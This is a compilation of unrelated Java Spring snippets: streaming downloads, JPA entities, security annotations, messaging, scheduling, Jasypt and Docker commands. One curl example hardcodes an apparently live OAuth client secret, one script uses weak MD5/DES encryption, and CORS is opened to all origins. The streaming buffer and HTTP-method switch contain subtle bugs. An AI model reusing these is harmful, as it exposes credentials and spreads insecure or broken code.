            try (final BufferedInputStream br = new BufferedInputStream(fileData.getFileStream())) {
                byte[] contents = new byte[1024];
                while (br.read(contents) != -1) {
                    outputStream.write(contents);
                    outputStream.flush();
                    contents = new byte[1024];
                }
                this.notifyEvent(fileData).accept(DownloadStatus.FINISHED);
            } catch (IOException ex) {
                try {
                    fileData.getFileStream().close();
                } catch (IOException closingException) {
                    log.warn("could not close command result, a http connection may be leaked !", closingException);
                }
                log.error("Unable to stream file source, message: {}", ex.getMessage());
                this.notifyEvent(fileData).accept(DownloadStatus.INTERRUPTED);
            }
        };
    }

    private StreamingResponseBody toStreamResponseBody(final FileData fileData) {
        return outputStream -> {
            try {
                this.notifyEvent(fileData).accept(DownloadStatus.DOWNLOADING);
                IOUtils.copyLarge(fileData.getFileStream(), outputStream);
                outputStream.flush();
                this.notifyEvent(fileData).accept(DownloadStatus.FINISHED);
            } catch (IOException ex) {
                try {
                    fileData.getFileStream().close();
                } catch (IOException closingException) {
                    log.warn("could not close command result, a http connection may be leaked!", closingException);
                }
                log.error("Unable to stream file source, message: {}", ex.getMessage());
                this.notifyEvent(fileData).accept(DownloadStatus.INTERRUPTED);
            }
        };
    }

    private Consumer<DownloadStatus> notifyEvent(final FileData fileData) {
        return status -> this.getEventPublisher().publishEvent(new DownloadEvent(this, MessageEntity.of(fileData.getSessionId(), status)));
    }
}
--------------------------------------------------------------------------------------------------------
@Entity
@Table(name="CREATION_DATE")
public class CreationDate implements Serializable {


    private static final long serialVersionUID = 1648102358397071136L;

    @Id
    @GeneratedValue(strategy=IDENTITY)
    @Column(name="DATE_ID")
    private int dateId;


    @Column(name="PARTICULAR_DATE")
    private Date particularDate;

    @Version
    @Column(name="VERSION")
    private int version;

    @Temporal(TemporalType.DATE)
    @Column(name="CHILD_GO_SCHOOL_DATE")
    private Date childGoSchoolDate;

    @Temporal(TemporalType.DATE)
    @Column(name="CHILD_ADMISSION_DATE")
    private Date childAdmissionDate;


    @ManyToMany(fetch = FetchType.LAZY)
    @Cascade(org.hibernate.annotations.CascadeType.ALL)
    @JoinTable(name="CREATIONDATE_INSTITUTION", 
                                    joinColumns=@JoinColumn(name="DATE_ID"), 
                    inverseJoinColumns=@JoinColumn(name="INSTITUTION_ID"))
    private Set<Institution> institution = new HashSet<Institution>();

    @OneToMany(fetch=FetchType.EAGER, orphanRemoval=true)
    @Cascade(org.hibernate.annotations.CascadeType.ALL)
    @JoinTable(name="SRC_DATE", joinColumns=@JoinColumn(name="DATE_ID"),
                    inverseJoinColumns=@JoinColumn(name="SRC_ID"))
    private List<ScheduleRotationChild> scheduleRotationChild = new ArrayList<ScheduleRotationChild>();


        //getter and setter methods ommited


    public String toString() {

        return  dateId + " , " 
            + particularDate + " , " 
            + childGoSchoolDate + " , " 
            + childAdmissionDate + "  " + scheduleRotationChild ;

    }
}

@Configuration
@EnableResourceServer
public class ResourceServerTestConfiguration extends ResourceServerConfigurerAdapter {
  private ResourceServerConfiguration configuration;

  public ResourceServerTestConfiguration(ResourceServerConfiguration configuration) {
    this.configuration = configuration;
  }

  @Override
  public void configure(ResourceServerSecurityConfigurer security) throws Exception {
    configuration.configure(security);
    security.stateless(false);
  }

  @Override
  public void configure(HttpSecurity http) throws Exception {
    configuration.configure(http);
  }
}
--------------------------------------------------------------------------------------------------------
@Entity
@SequenceGenerator(name="idgen", sequenceName="cat_id_seq", allocationSize=1)
@AttributeOverrides({
    @AttributeOverride(name="id", column = @Column(name="cat_id"))
})
@Table(name="categoria")
public class Category extends EntityId<Integer> {

    private static final long serialVersionUID = -870288485902136248L;

    @Column(name="name")
    private String name;

    @Column(name="description")
    private String description;

}
--------------------------------------------------------------------------------------------------------
@Entity
public class User {
    @Id
    @GeneratedValue(generator = "sequence-generator")
    @GenericGenerator(
      name = "sequence-generator",
      strategy = "org.hibernate.id.enhanced.SequenceStyleGenerator",
      parameters = {
        @Parameter(name = "sequence_name", value = "user_sequence"),
        @Parameter(name = "initial_value", value = "4"),
        @Parameter(name = "increment_size", value = "1")
        }
    )
    private long userId;
     
    // ...
}
--------------------------------------------------------------------------------------------------------
package com.concretepage.service;
import org.springframework.security.access.annotation.Secured;
import org.springframework.security.access.prepost.PostAuthorize;
import org.springframework.security.access.prepost.PreAuthorize;
import com.concretepage.User;
public interface IUserService {
	@Secured("authenticated")
	public void methodOne();
	
	@PreAuthorize("hasRole('ADMIN')")
	public void methodTwo(String msg);
	
	@PreAuthorize ("#user.userName == authentication.name")
	public void methodThree(User user);

	@PostAuthorize ("returnObject.userName == authentication.name")
	public User methodFour();
} 
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@SpringBootTest(webEnvironment = WebEnvironment.RANDOM_PORT)
public class SecuredControllerRestTemplateIntegrationTest {
 
    @Autowired
    private TestRestTemplate template;
 
    // ... other methods
 
    @Test
    public void givenAuthRequestOnPrivateService_shouldSucceedWith200() throws Exception {
        ResponseEntity<String> result = template.withBasicAuth("spring", "secret")
          .getForEntity("/private/hello", String.class);
        assertEquals(HttpStatus.OK, result.getStatusCode());
    }
}
--------------------------------------------------------------------------------------------------------

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.jms.annotation.EnableJms;
import org.springframework.jms.annotation.JmsListener;
import org.springframework.stereotype.Component;

@Component
@EnableJms
public class MessageConsumer {

    private final Logger logger = LoggerFactory.getLogger(MessageConsumer.class);

    @JmsListener(destination = "test-queue")
    public void listener(String message){
        logger.info("Message received {} ", message);
    }
}
--------------------------------------------------------------------------------------------------------
SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for `sched_config`
-- ----------------------------
DROP TABLE IF EXISTS `sched_config`;
CREATE TABLE `sched_config` (
  `id` bigint(20) NOT NULL,
  `code` varchar(50) DEFAULT NULL COMMENT '任务编码',
  `name` varchar(200) DEFAULT NULL COMMENT '任务名称',
  `target_service_type` varchar(2) DEFAULT NULL COMMENT '目标任务类型：01 springcloud 02 http 03 dubbo',
  `targer_service` varchar(50) DEFAULT NULL COMMENT '目标服务：可为服务地址，或者dubbo服务名',
  `cron_config` varchar(20) DEFAULT NULL COMMENT 'cron表达式',
  `status` varchar(1) DEFAULT NULL COMMENT '状态：1启用 0 停用',
  `remark` varchar(200) DEFAULT NULL COMMENT '备注说明',
  `extra_dubbo_group` varchar(50) DEFAULT NULL COMMENT 'dubbo组名',
  `extra_dubbo_version` varchar(50) DEFAULT NULL COMMENT 'dubbo服务版本信息',
  `gmt_create` datetime DEFAULT NULL COMMENT '创建时间',
  `gmt_modified` datetime DEFAULT NULL COMMENT '修改时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
--------------------------------------------------------------------------------------------------------
MAIL_FOLDER_CACHE

	@Bean
    public CacheManager cacheManager(RedisTemplate<String,String> redisTemplate) {
        RedisCacheManager rcm = new RedisCacheManager(redisTemplate);
        //使用前缀
        rcm.setUsePrefix(true);
        //缓存分割符 默认为 ":"
//        rcm.setCachePrefix(new DefaultRedisCachePrefix(":"));
        //设置缓存过期时间
        //rcm.setDefaultExpiration(60);//秒
        return rcm;
    }
--------------------------------------------------------------------------------------------------------
# freemarker配置

spring.freemarker.enabled=false

# 缓存配置 开发阶段应该配置为false 因为经常会改
spring.freemarker.cache=false

# 模版后缀名 默认为:.ftl
spring.freemarker.suffix=.html

# 文件编码
spring.freemarker.charset=UTF-8

# 模版加载的目录
spring.freemarker.template-loader-path=classpath:/templates/

# 配置
# locale	该选项指定该模板所用的国家/语言选项
# number_format	指定格式化输出数字的格式：currency、
# boolean_format	指定两个布尔值的语法格式,默认值是true,false
# date_format,time_format,datetime_format	定格式化输出日期的格式
# time_zone	设置格式化输出日期时所使用的时区
# 数字 千分位标识
spring.freemarker.settings.number_format=,##0.00 

# thymeleaf配置 
# 启用缓存:建议生产开启
spring.thymeleaf.cache=false

# 建议模版是否存在
spring.thymeleaf.check-template-location=true
# Content-Type 值
spring.thymeleaf.content-type=text/html
# 是否启用
spring.thymeleaf.enabled=true
# 模版编码
spring.thymeleaf.encoding=UTF-8
# 应该从解析中排除的视图名称列表（用逗号分隔）
spring.thymeleaf.excluded-view-names=
# 模版模式
spring.thymeleaf.mode=HTML5
# 模版存放路径
spring.thymeleaf.prefix=classpath:/templates/
# 模版后缀
spring.thymeleaf.suffix=.html

spring.profiles.active=jsp

# 最大支持文件大小 即单个文件大小
spring.http.multipart.max-file-size=1Mb
# 最大支持请求大小 即一次性上传的总文件大小
spring.http.multipart.max-request-size=10Mb

# 使用fileUpload
spring.http.multipart.enabled=false
--------------------------------------------------------------------------------------------------------
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;

@Configuration
public class WebConfig extends WebMvcConfigurerAdapter{

	@Override
	public void addResourceHandlers(ResourceHandlerRegistry registry) {
		//配置映射关系
		//即：/webjars/** 映射到 classpath:/META-INF/resources/webjars/ 
		registry.addResourceHandler("/webjars/**")
		        .addResourceLocations("classpath:/META-INF/resources/webjars/")
				//新增 resourceChain 配置即开启缓存配置。
		        //不知道为何不加这个配置 设置了 webjars-locator 未生效。。
		        .resourceChain(true);//生产时建议开启缓存（只是缓存了资源路径而不是资源内容）,开发是可以设置为false
	}
}
--------------------------------------------------------------------------------------------------------
# issuing requests to unsecured endpoints
curl localhost:8080/hello

# issuing requests to secured endpoints
CLIENT_ID="d85mVhuL6EPYitTES37pA8rbi716IYCA"
CLIENT_SECRET="AeeFp-g5YGwxFOWwLVMdxialnxOnoyuwGXoE5kPiHs8kGJeC2FJ0BCj6xTLlNKkY"

JWT=$(curl -X POST -H 'content-type: application/json' -d '{
    "client_id": "'$CLIENT_ID'",
    "client_secret": "'$CLIENT_SECRET'",
    "audience":"spring5",
    "grant_type":"client_credentials"
}' https://bkrebs.auth0.com/oauth/token | jq .access_token)

curl -H "Authorization: Bearer "$JWT http://localhost:8080/products
--------------------------------------------------------------------------------------------------------
# use Maven wrapper
mvn -N io.takari:maven:wrapper -Dmaven=3.5.4

# use Maven to package the application in a fat JAR file
./mvnw clean package

# run the fat JAR artifact
java -jar target/jsf-javaee-microblog-thorntail.jar
--------------------------------------------------------------------------------------------------------
group 'com.auth0.samples'
version '1.0-SNAPSHOT'

apply plugin: 'java'

// 1 - apply application and shadow plugins
apply plugin: 'application'
apply plugin: 'com.github.johnrengelman.shadow'

sourceCompatibility = 1.8
targetCompatibility = 1.8
mainClassName = 'com.auth0.samples.Main'

// 2 - define the dependency to the shadow plugin
buildscript {
    repositories {
        jcenter()
    }
    dependencies {
        classpath 'com.github.jengelman.gradle.plugins:shadow:2.0.1'
    }
}

// 3 - merge service descriptors
shadowJar {
    mergeServiceFiles()
}

repositories {
    jcenter()
}

dependencies {
    compile group: 'org.apache.tomcat.embed', name: 'tomcat-embed-jasper', version: '8.0.47'
    compile group: 'org.springframework', name: 'spring-webmvc', version: '5.0.1.RELEASE'
}
--------------------------------------------------------------------------------------------------------
# build the dockerized application image
docker build -t without-spring-session .

# running instance number one
docker run -d -p 8081:8080 --name without-spring-session-1 -e "APPLICATION_TITLE=First instance" without-spring-session
# running instance number two
docker run -d -p 8082:8080 --name without-spring-session-2 -e "APPLICATION_TITLE=Second instance" without-spring-session

# create redis image
docker build -t spring-session-redis redis

# run redis
docker run -p 6379:6379 -d --name spring-session-redis spring-session-redis

# remove previous instances
docker rm -f without-spring-session-1 without-spring-session-2

# compile and package the application
mvn clean package

# build the dockerized application image
docker build -t spring-session .

# running instance number one
docker run -d -p 8081:8080 --name spring-session-1 -e "APPLICATION_TITLE=First instance" spring-session
# running instance number two
docker run -d -p 8082:8080 --name spring-session-2 -e "APPLICATION_TITLE=Second instance" spring-session

# build the dockerized NGINX load balancer
docker build -t spring-session-nginx nginx

# run load balancer
docker run -p 8080:80 -d --name spring-session-nginx spring-session-nginx
--------------------------------------------------------------------------------------------------------
import org.ocpsoft.rewrite.annotation.Join;
import org.ocpsoft.rewrite.el.ELBeanName;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Component;

@Scope(value = "session")
@Component(value = "productController")
@ELBeanName(value = "productController")
@Join(path = "/product", to = "/product-form.jsf")
public class ProductController {
    @Autowired
    private ProductRepository productRepository;

    private Product product = new Product();

    public String save() {
        productRepository.save(product);
        product = new Product();
        return "/product-list.xhtml?faces-redirect=true";
    }

    public Product getProduct() {
        return product;
    }
}
--------------------------------------------------------------------------------------------------------
npm install yo generator-jhipster

# In case you picked Maven:
mvn spring-boot:run

# In case you picked Gradle:
gradle bootRun
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@WebMvcTest(controllers = SubscriberApiController.class)

public class ApiControllerTest {

private MockMvc mvc;

@Autowired
private WebApplicationContext webApplicationContext;

@MockBean
private ApiService service;

@Before
public void setUp() {
//  mvc = MockMvcBuilders.standaloneSetup(new HandlerController()).build();
    mvc = MockMvcBuilders.webAppContextSetup(webApplicationContext).build();
}

@Test
public void getIndex() throws Exception {
    mvc.perform(get("/my-service/api/check?email=someone@someone.com").accept(MediaType.APPLICATION_JSON))
       .andExpect(status().isOk());

}
}
--------------------------------------------------------------------------------------------------------
# issue a GET request to see the (empty) list of tasks
curl http://localhost:8080/tasks

# issue a POST request to create a new task
curl -H "Content-Type: application/json" -X POST -d '{
    "description": "Buy some milk(shake)"
}'  http://localhost:8080/tasks

# issue a PUT request to update the recently created task
curl -H "Content-Type: application/json" -X PUT -d '{
    "description": "Buy some milk"
}'  http://localhost:8080/tasks/1

# issue a DELETE request to remove the existing task
curl -X DELETE http://localhost:8080/tasks/1
--------------------------------------------------------------------------------------------------------
databaseChangeLog:
    - includeAll:
        path: db/changelog/changes/
--------------------------------------------------------------------------------------------------------
  @Bean
  CorsConfigurationSource corsConfigurationSource() {
    final UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", new CorsConfiguration().applyPermitDefaultValues());
    return source;
  }
--------------------------------------------------------------------------------------------------------
# create a variable with our token
ACCESS_TOKEN=<OUR_ACCESS_TOKEN>

# use this variable to fetch contacts
curl -H 'Authorization: Bearer '$ACCESS_TOKEN http://localhost:8080/contacts/
--------------------------------------------------------------------------------------------------------
import java.util.List;
 
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.converter.HttpMessageConverter;
import org.springframework.http.converter.json.MappingJackson2HttpMessageConverter;
import org.springframework.web.servlet.config.annotation.EnableWebMvc;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurerAdapter;
 
import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.ObjectMapper;
 
@Configuration
@EnableWebMvc
@ComponentScan(basePackages = "com.websystique.springmvc")
public class HelloWorldConfiguration extends WebMvcConfigurerAdapter{
     
     
    @Override
    public void extendMessageConverters(List<HttpMessageConverter<?>> converters) {
        converters.add(mappingJackson2HttpMessageConverter());
    }
     
    @Bean
    public MappingJackson2HttpMessageConverter mappingJackson2HttpMessageConverter() {
        MappingJackson2HttpMessageConverter converter = new MappingJackson2HttpMessageConverter();
        converter.setObjectMapper(new ObjectMapper().configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false));
        return converter;
    }
     
     
}
--------------------------------------------------------------------------------------------------------
executor.setRejectedExecutionHandler(new ThreadPoolExecutor.CallerRunsPolicy());


import java.text.ParseException;
import java.util.Date;

import org.quartz.Trigger;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.scheduling.quartz.CronTriggerFactoryBean;
import org.springframework.scheduling.quartz.MethodInvokingJobDetailFactoryBean;
import org.springframework.scheduling.quartz.SchedulerFactoryBean;
import org.springframework.stereotype.Component;

import lombok.extern.slf4j.Slf4j;

@Configuration
@Slf4j
public class QuartzConfig {
	
	/**
	 * 通过工厂类，创建job实例
	 * @return
	 */
	@Bean
	public MethodInvokingJobDetailFactoryBean customJobDetailFactoryBean() {
        
		MethodInvokingJobDetailFactoryBean jobDetail = new MethodInvokingJobDetailFactoryBean();
        //设置执行任务的bean
		jobDetail.setTargetBeanName("quartzTask");
		//设置具体执行的方法
        jobDetail.setTargetMethod("quartzTask");
        //同步执行，上一任务未执行完，下一任务等待
        //true 任务并发执行
        //false 下一个任务必须等待上一任务完成
        jobDetail.setConcurrent(false);
        return jobDetail; 
	}
	
	/**
	 * 通过工厂类创建Trigger
	 * @param jobDetailFactoryBean
	 * @return
	 * @throws ParseException 
	 */
	@Bean(name = "cronTriggerBean")
	public Trigger cronTriggerBean(MethodInvokingJobDetailFactoryBean jobDetailFactoryBean) throws ParseException {
		CronTriggerFactoryBean cronTriggerFactoryBean = new CronTriggerFactoryBean();
		cronTriggerFactoryBean.setJobDetail(jobDetailFactoryBean.getObject());
		cronTriggerFactoryBean.setCronExpression("0/3 * * * * ?");//每3秒执行一次
		cronTriggerFactoryBean.setName("customCronTrigger");
		cronTriggerFactoryBean.afterPropertiesSet();
		return cronTriggerFactoryBean.getObject();

	}
	
	/**
	 * 调度工厂类,自动注入Trigger
	 * @return
	 */
	@Bean
	public SchedulerFactoryBean schedulerFactoryBean(Trigger... triggers) {
		SchedulerFactoryBean bean = new SchedulerFactoryBean();
		
		//也可以直接注入 ApplicationContext,利于 getBeansOfType获取trigger
//		Map<String,Trigger> triggerMap = appContext.getBeansOfType(Trigger.class);
//		if(triggerMap != null) {
//			List<Trigger> triggers = new ArrayList<>(triggerMap.size());
//			//
//			triggerMap.forEach((key,trigger)->{
//				triggers.add(trigger);
//			});
//			bean.setTriggers(triggers.toArray(new Trigger[triggers.size()]));
//		}
		//这里注意 对应的trigger 不能为null 不然会异常的
		bean.setTriggers(triggers);
		return bean;
	} 
	
	@Component("quartzTask")
	public class QuartzTask {
	  
		public void quartzTask() {
			log.info("Quartz定时任务：" + new Date());
		}
	}
}
--------------------------------------------------------------------------------------------------------
additional-spring-configuration-metadata.json

{
	"properties": [
		{
			"name": "blog.address",
			"type": "java.lang.String",
			"description": "博客地址"
		}
	]
}

    @EventListener(condition = "#downloadEvent.messageEntity.code == 'oKong'")
--------------------------------------------------------------------------------------------------------
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.data.mongodb.config.EnableMongoAuditing;
import org.springframework.data.mongodb.repository.config.EnableMongoRepositories;

import lombok.extern.slf4j.Slf4j;

/**
 * mongodb 集成示例
 * @author oKong
 *
 */
@SpringBootApplication
@EnableMongoAuditing
//@EnableMongoRepositories(basePackages="cn.lqdev")//当有些dao不在default page下时 可通过此方法进行注册扫描包
@Slf4j
public class MongodbApplication {

	public static void main(String[] args) throws Exception {
		SpringApplication.run(MongodbApplication.class, args);
		log.info("spring-boot-mongodb-chapter31启动!");
	}
}
--------------------------------------------------------------------------------------------------------
import org.springframework.context.ApplicationListener;
import org.springframework.stereotype.Component;

import cn.lqdev.learning.springboot.chapter32.event.CustomEvent;
import lombok.extern.slf4j.Slf4j;


@Component
@Slf4j
public class EventListener implements ApplicationListener<CustomEvent>{

	@Override
	public void onApplicationEvent(CustomEvent event) {
		//这里也可以监听所有事件 使用  ApplicationEvent 类即可
		//这里仅仅监听自定义事件 CustomEvent
		log.info("ApplicationListener方式监听事件：{}", event);
	}
}
--------------------------------------------------------------------------------------------------------
import javax.jws.WebMethod;
import javax.jws.WebParam;
import javax.jws.WebResult;
import javax.jws.WebService;
import javax.xml.bind.annotation.XmlSeeAlso;
import javax.xml.ws.RequestWrapper;
import javax.xml.ws.ResponseWrapper;

/**
 * This class was generated by Apache CXF 3.2.5
 * 2018-11-10T20:20:08.070+08:00
 * Generated source version: 3.2.5
 *
 */
@WebService(targetNamespace = "http://www.lqdev.cn/webservice", name = "authorPortType")
@XmlSeeAlso({ObjectFactory.class})
public interface AuthorPortType {

    @WebMethod
    @RequestWrapper(localName = "getAuthorByName", targetNamespace = "http://www.lqdev.cn/webservice", className = "cn.lqdev.webservice.GetAuthorByName")
    @ResponseWrapper(localName = "getAuthorByNameResponse", targetNamespace = "http://www.lqdev.cn/webservice", className = "cn.lqdev.webservice.GetAuthorByNameResponse")
    @WebResult(name = "return", targetNamespace = "")
    public cn.lqdev.webservice.AuthorDto getAuthorByName(
        @WebParam(name = "authorName", targetNamespace = "")
        java.lang.String authorName
    );

    @WebMethod
    @RequestWrapper(localName = "getAuthorList", targetNamespace = "http://www.lqdev.cn/webservice", className = "cn.lqdev.webservice.GetAuthorList")
    @ResponseWrapper(localName = "getAuthorListResponse", targetNamespace = "http://www.lqdev.cn/webservice", className = "cn.lqdev.webservice.GetAuthorListResponse")
    @WebResult(name = "return", targetNamespace = "")
    public java.util.List<cn.lqdev.webservice.AuthorDto> getAuthorList();

    @WebMethod
    @RequestWrapper(localName = "getAuthorString", targetNamespace = "http://www.lqdev.cn/webservice", className = "cn.lqdev.webservice.GetAuthorString")
    @ResponseWrapper(localName = "getAuthorStringResponse", targetNamespace = "http://www.lqdev.cn/webservice", className = "cn.lqdev.webservice.GetAuthorStringResponse")
    @WebResult(name = "return", targetNamespace = "")
    public java.lang.String getAuthorString(
        @WebParam(name = "authorName", targetNamespace = "")
        java.lang.String authorName
    );
}
--------------------------------------------------------------------------------------------------------
	@Bean
	public ConfigurationCustomizer configurationCustomizer() {
		ConfigurationCustomizer config = new ConfigurationCustomizer() {
			
			@Override
			public void customize(org.apache.ibatis.session.Configuration configuration) {
//				TypeAliasRegistry typeAliasRegistry = configuration.getTypeAliasRegistry();
				// mapper接口注册器
//				MapperRegistry mapperRegistry = configuration.getMapperRegistry();
				// 类型处理器
				TypeHandlerRegistry typeHandlerRegistry = configuration.getTypeHandlerRegistry();
				typeHandlerRegistry.register(StatusEnum.class, EnumOrdinalTypeHandler.class);
			}
		};
		
		return config;
	}
--------------------------------------------------------------------------------------------------------
import org.springframework.context.annotation.Configuration;

import com.ulisesbocchio.jasyptspringboot.annotation.EncryptablePropertySource;

/** 
*
* @ClassName   类名：JasyptConfig 
* @Description 功能说明：自定义配置文件加解密配置
* <p>
* TODO
*</p>
************************************************************************
* @date        创建日期：2019年5月8日
* @author      创建人：oKong
* @version     版本号：V1.0
*<p>
***************************修订记录*************************************
* 
*   2019年5月8日   oKong   创建该类功能。
*
***********************************************************************
*</p>
*/
@Configuration
//这里可加载多个 使用{}方式
@EncryptablePropertySource(name = "encryptedProperties", value = "classpath:encrypted.properties")
public class JasyptConfig {

}
--------------------------------------------------------------------------------------------------------
import org.springframework.amqp.core.AmqpTemplate;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import cn.hutool.http.HttpUtil;
import cn.lqdev.learning.springboot.chapter38.constant.ApplicationConstant;
import cn.lqdev.learning.springboot.chapter38.entity.HttpEntity;
import lombok.extern.slf4j.Slf4j;

/** 
*
* @ClassName   类名：HttpMessagerService 
* @Description 功能说明：
* <p>
* TODO
*</p>
************************************************************************
* @date        创建日期：2019年7月17日
* @author      创建人：oKong
* @version     版本号：V1.0
*<p>
***************************修订记录*************************************
* 
*   2019年7月17日   oKong   创建该类功能。
*
***********************************************************************
*</p>
*/
@Component
@Slf4j
public class HttpMessagerService {
	
	@Autowired
	AmqpTemplate mqTemplate;	
	
	public void notify(String queue,HttpEntity httpEntity) {
		//发起请求
		log.info("开始发起http请求:{}", httpEntity);
		try {
			switch(httpEntity.getMethod().toLowerCase()) {
			case "POST":
				  HttpUtil.post(httpEntity.getUrl(), httpEntity.getParams());
				  break;
			case "GET":
			default:
				HttpUtil.get(httpEntity.getUrl(), httpEntity.getParams());
			}
		} catch (Exception e) {
			//发生异常，放入延迟队列中
			String nextRk = ApplicationConstant.delayRefMap.get(queue);
			if(ApplicationConstant.HTTP_MESSAGE_ONE_QUEUE_NAME.equals(queue)) {
				//若已经是最后一个延迟队列的消息队列了，则后续可直接放入数据库中 待后续定时策略进行再次发送
				log.warn("http通知已经通知N次失败，进入定时进行发起通知,url={}", httpEntity.getUrl());
			} else {
			   log.warn("http重新发送通知：{}, 通知队列rk为：{}, 原队列：{}", httpEntity.getUrl(), nextRk, queue);
			   mqTemplate.convertAndSend(ApplicationConstant.HTTP_MESSAGE_EXCHANGE, nextRk, cn.hutool.json.JSONUtil.toJsonStr(httpEntity));
			}
		}
	}

}


import org.springframework.amqp.core.Message;
import org.springframework.amqp.rabbit.annotation.RabbitListener;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import com.rabbitmq.client.Channel;

import cn.hutool.json.JSONUtil;
import cn.lqdev.learning.springboot.chapter38.constant.ApplicationConstant;
import cn.lqdev.learning.springboot.chapter38.entity.HttpEntity;
import cn.lqdev.learning.springboot.chapter38.service.HttpMessagerService;
import lombok.extern.slf4j.Slf4j;

/** 
*
* @ClassName   类名：HttpMessagerLister 
* @Description 功能说明：http通知消费监听接口
* <p>
* TODO
*</p>
************************************************************************
* @date        创建日期：2019年7月17日
* @author      创建人：oKong
* @version     版本号：V1.0
*<p>
***************************修订记录*************************************
* 
*   2019年7月17日   oKong   创建该类功能。
*
***********************************************************************
*</p>
*/
@Component
@Slf4j
public class HttpMessagerLister {
	
	@Autowired
	HttpMessagerService messagerService;
	
	@RabbitListener(id = "httpMessageNotifyConsumer", queues = {ApplicationConstant.HTTP_MESSAGE_START_QUEUE_NAME}, containerFactory = "notifyListenerContainer")
	public void httpMessageNotifyConsumer(Message message, Channel channel) throws Exception {
		doHandler(message, channel);
	}
	
	@RabbitListener(id= "httpDelayMessageNotifyConsumer", queues = {
			ApplicationConstant.HTTP_MESSAGE_ONE_QUEUE_NAME,}, containerFactory = "delayNotifyListenerContainer")
	public void httpDelayMessageNotifyConsumer(Message message, Channel channel) throws Exception {
		doHandler(message, channel);
	}
	
	private void doHandler(Message message, Channel channel) throws Exception {
		String body = new String(message.getBody(),"utf-8");
		String queue = message.getMessageProperties().getConsumerQueue();
		log.info("接收到通知请求：{}，队列名：{}",body, queue);
		//消息对象转换
		try {
			HttpEntity httpNotifyDto = JSONUtil.toBean(body, HttpEntity.class);
			channel.basicAck(message.getMessageProperties().getDeliveryTag(), false);
			//发送通知
			messagerService.notify(queue, httpNotifyDto);
		} catch(Exception e) {
			log.error(e.getMessage());
			//ack
			channel.basicAck(message.getMessageProperties().getDeliveryTag(), false);
		}
	}

}
--------------------------------------------------------------------------------------------------------
@echo off
set/p input=待加密的明文字符串：
set/p password=加密密钥(盐值)：
echo 加密中......
java -cp jasypt-1.9.2.jar org.jasypt.intf.cli.JasyptPBEStringEncryptionCLI input=%input% password=%password% algorithm=PBEWithMD5AndDES
pause
```
--------------------------------------------------------------------------------------------------------
@Controller
@RequestMapping("/dept")
public class DeptController {

    @RequestMapping("{id:[0-9]+}")
    public String handleRequest(@PathVariable("id") String userId, Model model){
        model.addAttribute("msg", "profile id: "+userId);
        return "my-page";

    }

    @RequestMapping("{name:[a-zA-Z]+}")
    public String handleRequest2 (@PathVariable("name") String deptName, Model model) {
        model.addAttribute("msg", "dept name : " + deptName);
        return "my-page";
    }
}

mvn  clean install tomcat7:run-war
--------------------------------------------------------------------------------------------------------
# ===============================
# JPA / HIBERNATE
# ===============================
 
spring.jpa.show-sql=true
spring.jpa.hibernate.ddl-auto=update
spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.SQLServer2012Dialect
--------------------------------------------------------------------------------------------------------
import java.util.HashMap;
import java.util.Map;
 
import org.springframework.boot.actuate.info.Info;
import org.springframework.boot.actuate.info.InfoContributor;
import org.springframework.stereotype.Component;
 
  
 
@Component
public class BuildInfoContributor implements InfoContributor {
     
    @Override
    public void contribute(Info.Builder builder) {
        Map<String,String> data= new HashMap<String,String>();
        data.put("build.version", "2.0.0.M7");
        builder.withDetail("buildInfo", data);
    }
     
}
--------------------------------------------------------------------------------------------------------
import com.gpch.login.model.User;
import com.gpch.login.repository.RoleRepository;
import com.gpch.login.repository.UserRepository;
import org.junit.Before;
import org.junit.Test;
import org.mockito.Mock;
import org.mockito.Mockito;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

import static org.junit.Assert.assertEquals;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.MockitoAnnotations.initMocks;

public class UserServiceTest {

    @Mock
    private UserRepository mockUserRepository;
    @Mock
    private RoleRepository mockRoleRepository;
    @Mock
    private BCryptPasswordEncoder mockBCryptPasswordEncoder;

    private UserService userServiceUnderTest;
    private User user;

    @Before
    public void setUp() {
        initMocks(this);
        userServiceUnderTest = new UserService(mockUserRepository,
                                               mockRoleRepository,
                                               mockBCryptPasswordEncoder);
        user = User.builder()
                .id(1)
                .name("Gustavo")
                .lastName("Ponce")
                .email("test@test.com")
                .build();

        Mockito.when(mockUserRepository.save(any()))
                .thenReturn(user);
        Mockito.when(mockUserRepository.findByEmail(anyString()))
                .thenReturn(user);
    }

    @Test
    public void testFindUserByEmail() {
        // Setup
        final String email = "test@test.com";

        // Run the test
        final User result = userServiceUnderTest.findUserByEmail(email);

        // Verify the results
        assertEquals(email, result.getEmail());
    }

    @Test
    public void testSaveUser() {
        // Setup
        final String email = "test@test.com";

        // Run the test
        User result = userServiceUnderTest.saveUser(User.builder().build());

        // Verify the results
        assertEquals(email, result.getEmail());
    }
}
--------------------------------------------------------------------------------------------------------


@Converter
public class PeriodStringConverter
        implements AttributeConverter<Period, String> {

    @Override
    public String convertToDatabaseColumn(Period attribute) {
        return attribute.toString();
    }

    @Override
    public Period convertToEntityAttribute(String dbData) {
        return Period.parse( dbData );
    }
}





@Entity(name = "Event")
public static class Event {

    @Id
    @GeneratedValue
    private Long id;

